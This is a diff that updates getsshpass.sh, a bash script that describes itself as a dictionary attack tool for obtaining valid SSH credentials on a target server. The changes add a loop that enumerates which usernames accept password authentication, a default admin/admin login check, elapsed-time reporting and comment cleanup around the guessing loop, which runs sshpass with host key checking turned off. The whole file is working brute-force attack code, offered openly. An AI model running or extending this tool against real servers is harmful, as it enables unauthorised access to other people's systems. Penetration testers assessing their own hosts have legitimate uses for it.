@@ -1,13 +1,23 @@
-#!/bin/bash
+#!/usr/bin/env bash
+#
+# getsshpass.sh 0.9
+# Copyright (C) 2016 Radovan Brezula 'brezular'
+# Code additions by Blai Peidro
+# License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+# This is free software: you are free to change and redistribute it.
+# There is NO WARRANTY, to the extent permitted by law.
+#
+# This script launches a dictionary attack against the SSH service of a server
+# in order to get valid SSH login credentials for the targeted server.
 #
 # sshpass return values:
-#   0 - password OK
-#   3 - general runtime error
-#   5 - bad password
-#   255 - connection refused
+#  0   - password OK
+#  3   - general runtime error
+#  5   - bad password
+#  255 - connection refused
 
-
-declare -r START_TIME=$(date +%s.%N)   # Start time of the program
+# Start time of the program
+declare -r START_TIME=$(date +%s.%N)   
 
 function usage { 
   echo -e "Usage: $0 [OPTIONS]"
@@ -24,8 +34,9 @@ function usage {
 
 function version
  {
-  echo -e "getsshpass.sh 0.8"
+  echo -e "getsshpass.sh 0.9"
   echo -e "Copyright (C) 2016 Radovan Brezula 'brezular'"
+  echo -e "Code additions by Blai Peidro"
   echo -e "License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>."
   echo -e "This is free software: you are free to change and redistribute it."
   echo -e "There is NO WARRANTY, to the extent permitted by law."
@@ -69,7 +80,7 @@ function check_args {
     [ "$?" -ne 0 ] && echo "'$ip' is not valid IP address, exiting" && usage && exit 
  fi
 
- [ -z "$nval" ] && nval=0.1                                                  # Use default value 0.1s if no -n is entered
+ [ -z "$nval" ] && nval=0.1       # Use default value 0.1s if no -n is entered
 
  [ -z "$port" ] && echo "TCP port can'be empty, exiting" && usage && exit
  if [[ "$port" =~ ^[[:digit:]]+$ ]]; then
@@ -86,12 +97,12 @@ function check_args {
 
  [ ! -f "$passlist" ] && echo "Can't find file with list of passwords, exiting" && usage && exit
  [ ! -f "$userlist" ] && echo "Can't find file with list of users, exiting" && usage && exit
- fullpasslist="$passlist"                                                                         #Backup original passlist
- fulluserlist="$userlist"                                                                         #Backup oroginal userlist
+ fullpasslist="$passlist"  #Backup original passlist
+ fulluserlist="$userlist"  #Backup oroginal userlist
 
- # Check SSH connection 
- echo -n "Checking SSH connection to '$ip': "
- sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 -p "$port" admin@"$ip" exit &>/dev/null; rvalssh="$?"
+# Check SSH connection 
+echo -n "Checking SSH connection to '$ip': "
+sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 -p "$port" admin@"$ip" exit &>/dev/null; rvalssh="$?"
  if [ "$rvalssh" == 0 ]; then
     echo "*** OK ***"
     echo "*** Found username: 'admin' and password: 'admin' ***"  > "$pthdir/x0x901f22result.txt"
@@ -102,7 +113,19 @@ function check_args {
  else
     echo "*** OK ***"
  fi
- 
+
+# Added by Blai Peidro
+# Check each username in the user list to see if it has password authentication enabled on the target
+> "$pthdir/x092userlist.txt" # erase file on every new execution of this script
+while read user; do
+  status=$(ssh -o BatchMode=yes -o ConnectTimeout=5 $user@$ip echo ok 2>&1);
+  echo $status | grep "password" > /dev/null;
+  if [ "$?" = "0" ] ; then echo $user >> "$pthdir/x092userlist.txt"; fi;
+done < "$userlist";
+
+userlist="$pthdir/x092userlist.txt"      # new user list
+fulluserlist="$pthdir/x092userlist.txt"  # new user list
+
 # Read saved username and password from file 01xza01.txt, if file exists read saved credentials from file
     if [ -f "$pthdir/01xza01.txt" ]; then
        lastuser=$(head -1 "$pthdir/01xza01.txt" | cut -d ":" -f1)
@@ -158,11 +181,12 @@ function launch_attack {
        fi
        sleep $nval
     done < "$passlist"
-    passlist="$fullpasslist"                                                        # Always start search with first pass from dictionary when user is changed 
+    passlist="$fullpasslist" # Always start search with first pass from dictionary when user is changed 
  done < "$userlist"
  evaluate_result
 }
 
+# Added by Blai Peidro
 # Show ellapsed time
 function ellapsed_time {
  END_TIME=$(date +%s.%N)
@@ -182,15 +206,16 @@ function ellapsed_time {
 }
 
 function evaluate_result {
-    [ -f "$pthdir/01xza01.txt" ] && rm "$pthdir/01xza01.txt"                         # We don't need last saved password when script kills itself (password found) or
-    if [ -f "$pthdir/x0x901f22result.txt" ]; then                                    # Display found username and password when password is found
+    [ -f "$pthdir/01xza01.txt" ] && rm "$pthdir/01xza01.txt"   # We don't need last saved password when script kills itself (password found) or
+    if [ -f "$pthdir/x0x901f22result.txt" ]; then              # Display found username and password when password is found
        cat "$pthdir/x0x901f22result.txt"
        ellapsed_time
+       exit
     else 
        echo "*** Password not found, use other dictionary ***" 
     fi
-    [ -f "$inituserlist".new ] && rm "$inituserlist".new                              # delete files $inituserlist.new and $initpasslist.new
-    [ -f "$initpasslist".new ] && rm "$initpasslist".new                              # they're created when interrupted guessing is used   
+    [ -f "$inituserlist".new ] && rm "$inituserlist".new       # delete files $inituserlist.new and $initpasslist.new
+    [ -f "$initpasslist".new ] && rm "$initpasslist".new       # they're created when interrupted guessing is used   
     pkill sshpass  
 }
 
@@ -200,12 +225,9 @@ function monitor_signal {
  trap 'pkill sshpass; echo "Ctrl+Z detected, start script again to continue with attack"; exit' SIGTSTP
 }
 
-
 ### BODY ### 
 
 read_args $@
 check_args
 monitor_signal
 launch_attack
-
-
